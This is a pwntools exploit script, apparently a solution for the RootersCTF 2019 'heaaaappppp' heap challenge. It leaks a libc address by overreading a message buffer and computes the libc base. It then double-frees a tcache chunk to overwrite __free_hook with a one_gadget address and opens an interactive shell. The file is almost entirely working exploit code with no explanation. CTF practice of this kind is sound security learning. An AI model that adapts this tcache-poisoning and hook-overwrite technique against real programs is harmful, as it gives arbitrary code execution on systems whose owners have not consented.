from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file_name = './data/bin/heap23_51_rootersctf_2019_heaaaappppp'

li = lambda x : print('\x1b[01;38;5;214m' + str(x) + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + str(x) + '\x1b[0m')

r = process('./data/bin/heap23_51_rootersctf_2019_heaaaappppp')

elf = ELF(file_name)
libc = elf.libc

def dbgg():
    raw_input()

menu = b'Enter your choice: '

def add(payload):
    r.sendlineafter(menu, '0')
    r.sendlineafter("user: ",'0')
    r.sendafter("username: ",payload)

def edit(payload):
    r.sendlineafter(menu,'1')
    r.sendlineafter("user: ",'0')
    r.sendafter("username: ",payload)

def delete():
    r.sendlineafter(menu,'2')

def sendMessage(payload):
    r.sendlineafter(menu,'3')
    r.sendafter("sent: \n",payload)

r.sendlineafter(menu, '3')
r.sendafter('Enter message to be sent: ', b'a' * 0x60 + b'deadbeef')
r.recvuntil(b'deadbeef')
leak_addr = u64(r.recv(6).ljust(8, b'\x00'))
li('leak_addr = ' + hex(leak_addr))

libc_base = leak_addr - libc.sym['_IO_2_1_stdout_']
li('libc_base = ' + hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget = libc_base + one[1]

add('a')
delete()
delete()
sendMessage(p64(free_hook))
add(p64(one_gadget))
sendMessage(p64(one_gadget))
delete()

r.interactive()